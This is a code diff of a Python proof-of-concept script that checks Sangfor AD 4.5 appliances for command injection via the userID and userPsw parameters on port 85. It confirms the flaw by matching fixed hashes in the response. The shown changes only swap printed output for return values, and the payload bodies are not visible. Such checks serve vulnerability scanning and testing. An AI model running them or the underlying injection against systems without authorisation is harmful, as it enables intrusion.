@@ -9,8 +9,6 @@ description: 85端口两处命令执行，参数userID和userPsw。
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
 
 class sangfor_ad_script_command_exec_BaseVerify():
     def __init__(self, url):
@@ -38,17 +36,17 @@ class sangfor_ad_script_command_exec_BaseVerify():
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
 
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在深信服 AD4.5版本下命令执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return "[+]存在深信服 AD4.5版本下命令执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
             req = requests.post(vulnurl, data=post_data2, headers=headers, timeout=10, verify=False)
 
             if r"d93591bdf7860e1e4ee2fca799911215" in req.text:
-                cprint("[+]存在深信服 AD4.5版本下命令执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data2, indent=4), "red")
-
+                return "[+]存在深信服 AD4.5版本下命令执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data2, indent=4)
+            else:
+                return "[-]no vuln"
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ====>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = sangfor_ad_script_command_exec_BaseVerify(sys.argv[1])
     testVuln.run()
